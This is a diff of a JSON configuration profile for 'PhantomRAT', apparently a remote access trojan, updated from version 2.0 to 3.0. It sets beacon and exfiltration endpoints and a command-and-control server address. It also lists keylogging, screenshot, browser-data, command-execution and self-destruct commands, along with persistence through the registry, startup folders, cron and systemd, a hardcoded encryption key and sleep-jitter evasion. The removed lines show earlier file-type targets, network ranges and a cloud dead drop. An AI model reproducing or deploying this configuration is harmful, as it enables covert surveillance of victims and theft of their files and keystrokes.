@@ -1,101 +1,212 @@
+
 {
   "name": "PhantomRAT_Stealth_Profile",
-  "version": "2.0",
+  "version": "3.0",
+  "description": "Production profile for PhantomRAT C2 v3.0",
+  "author": "Biggest Wells",
+  "created": "2025-12-10",
+  
   "http-get": {
     "client": {
       "header": {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Accept": "application/json, text/plain, */*",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-Phantom": "Active",
+        "Accept": "*/*",
         "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate",
         "Connection": "keep-alive",
-        "Cache-Control": "no-cache",
-        "Pragma": "no-cache"
+        "Cache-Control": "no-cache"
       },
-      "uri": "/api/v1/update",
+      "uri": "/phantom/beacon",
       "verb": "GET",
-      "parameters": {
-        "client_id": "{{RANDOM_8}}",
-        "session": "{{RANDOM_16}}",
-        "timestamp": "{{TIMESTAMP}}"
-      }
+      "parameters": {}
     },
     "server": {
       "header": {
-        "Content-Type": "application/json; charset=utf-8",
+        "Content-Type": "application/octet-stream",
         "Server": "nginx/1.18.0",
-        "X-Content-Type-Options": "nosniff",
-        "X-Frame-Options": "DENY"
-      },
-      "output": {
-        "base64": true,
-        "gzip": true,
-        "encrypt": true
-      }
-    }
-  },
-  "http-post": {
-    "client": {
-      "header": {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Content-Type": "application/json; charset=utf-8",
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate",
-        "Connection": "keep-alive",
-        "Cache-Control": "no-cache",
-        "X-Requested-With": "XMLHttpRequest"
-      },
-      "uri": "/api/v1/data",
-      "verb": "POST",
-      "parameters": {
-        "source": "analytics",
-        "type": "telemetry",
-        "version": "1.0"
-      }
-    },
-    "server": {
-      "header": {
-        "Content-Type": "application/json; charset=utf-8",
-        "Server": "nginx/1.18.0",
-        "X-Content-Type-Options": "nosniff"
+        "X-Phantom-Response": "Ghost"
       },
       "output": {
         "base64": false,
         "gzip": false,
-        "encrypt": false
+        "encrypt": true,
+        "format": "json"
       }
     }
   },
-  "sleep": {
-    "min": 45,
-    "max": 120,
-    "jitter": 15
+  
+  "http-post": {
+    "client": {
+      "header": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-Phantom": "Data",
+        "Content-Type": "application/octet-stream",
+        "Accept": "*/*",
+        "Connection": "keep-alive"
+      },
+      "uri": "/phantom/exfil",
+      "verb": "POST",
+      "parameters": {}
+    },
+    "server": {
+      "header": {
+        "Content-Type": "application/octet-stream",
+        "Server": "nginx/1.18.0",
+        "X-Phantom-Status": "Received"
+      },
+      "output": {
+        "base64": false,
+        "gzip": false,
+        "encrypt": false,
+        "format": "json"
+      }
+    }
   },
+  
+  "dashboard": {
+    "uri": "/",
+    "login": {
+      "uri": "/login",
+      "method": "POST"
+    },
+    "api": {
+      "stats": "/api/stats",
+      "implants": "/api/implants",
+      "tasks": "/api/task"
+    }
+  },
+  
+  "sleep": {
+    "base": 30,
+    "min": 25,
+    "max": 45,
+    "jitter": 10,
+    "jitter_percent": 30
+  },
+  
   "encryption": {
-    "algorithm": "AES-256-GCM",
-    "key": "shared_secret_key_32_chars_long_phantom",
+    "algorithm": "AES-256-CBC",
+    "key": "phantomrat_32_char_encryption_key_here",
+    "key_derivation": "PBKDF2HMAC-SHA256",
+    "iterations": 100000,
+    "salt_length": 32,
     "iv_length": 16
   },
+  
+  "implant": {
+    "id_format": "GHOST-[A-F0-9]{8}",
+    "id_generation": "md5(hostname)[:8]",
+    "registration": {
+      "type_field": "type",
+      "types": ["register", "data_exfil", "task_results", "heartbeat"]
+    },
+    "capabilities": {
+      "sysinfo": true,
+      "file_ops": true,
+      "network_scan": true,
+      "process_ops": true,
+      "browser_data": false,
+      "gui_modules": false,
+      "persistence": true
+    }
+  },
+  
+  "commands": {
+    "available": [
+      "sysinfo",
+      "sysinfo_basic",
+      "network_scan",
+      "list_files",
+      "download",
+      "execute",
+      "list_processes",
+      "kill_process",
+      "browser_data",
+      "persist",
+      "screenshot",
+      "keylog_start",
+      "keylog_stop",
+      "keylog_get",
+      "ping",
+      "get_id",
+      "self_destruct"
+    ],
+    "format": {
+      "command": "string",
+      "arguments": "string",
+      "id": "integer"
+    }
+  },
+  
+  "network": {
+    "timeout": 15,
+    "retries": 3,
+    "backoff": {
+      "base": 2,
+      "max_wait": 300
+    },
+    "validation": {
+      "check_headers": true,
+      "required_headers": ["User-Agent", "X-Phantom"],
+      "expected_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    }
+  },
+  
   "obfuscation": {
-    "sleep_variance": true,
-    "fake_traffic": true,
-    "mimic_requests": true
+    "enabled": true,
+    "techniques": {
+      "sleep_jitter": true,
+      "split_sleep": true,
+      "random_cpu_activity": true,
+      "fake_headers": false,
+      "mimic_traffic": false
+    }
   },
-  "targets": {
-    "file_extensions": [".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".jpg", ".png", ".sql", ".db"],
-    "backup_paths": ["/var/backups", "/home/*/backup", "C:\\Backup"],
-    "network_ranges": ["141.105.71.0/24", "192.168.1.0/24"]
+  
+  "persistence": {
+    "methods": ["registry", "startup_folder", "cron", "systemd"],
+    "priority": "medium",
+    "self_heal": true,
+    "watchdog": false
   },
+  
+  "logging": {
+    "level": "error",
+    "file": null,
+    "console": false,
+    "max_size": 1048576,
+    "backup_count": 3
+  },
+  
   "c2": {
-    "primary": "http://141.105.71.196",
-    "secondary": ["http://141.105.71.2", "http://141.105.71.10"],
-    "cloud_fallback": true,
-    "dead_drop": "https://drive.google.com"
+    "primary": "http://141.105.71.196:8000",
+    "fallback": [],
+    "auto_discover": false,
+    "domain_fronting": false,
+    "cdn_support": false
   },
-  "modules": {
-    "auto_load": ["keylogger", "network", "fileops"],
-    "on_demand": ["screencap", "webcam", "mic"]
+  
+  "security": {
+    "validate_timestamp": true,
+    "timestamp_tolerance": 300,
+    "check_message_age": true,
+    "max_message_age": 300,
+    "nonce_length": 16,
+    "sign_requests": false
+  },
+  
+  "compatibility": {
+    "python_min": "3.8",
+    "os": ["windows", "linux", "darwin"],
+    "arch": ["x86", "x64", "arm64"],
+    "dependencies": ["requests", "cryptography", "psutil"]
+  },
+  
+  "versioning": {
+    "major": 3,
+    "minor": 0,
+    "patch": 0,
+    "compatible_with": ["2.0", "3.0"]
   }
 }
 
